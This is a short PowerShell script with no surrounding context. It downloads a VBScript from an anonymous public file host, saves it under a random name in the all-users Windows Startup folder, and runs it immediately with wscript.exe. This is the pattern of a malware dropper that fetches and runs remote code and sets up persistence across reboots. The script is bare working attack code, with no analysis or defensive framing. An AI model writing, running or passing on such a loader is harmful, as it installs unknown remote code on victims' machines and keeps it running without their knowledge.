$url = "https://files.catbox.moe/in6cm4.vbs"
$destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"

# Ensure directory exists
if (!(Test-Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup")) {
    Write-Output "Error: Startup folder does not exist!"
    exit
}

# Download the file
Invoke-WebRequest -Uri $url -OutFile $destination

# Ensure the file was downloaded successfully
if (Test-Path $destination) {
    # Run the VBScript
    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destination`"" -NoNewWindow -Wait
} else {
    Write-Output "Error: File was not downloaded!"
}
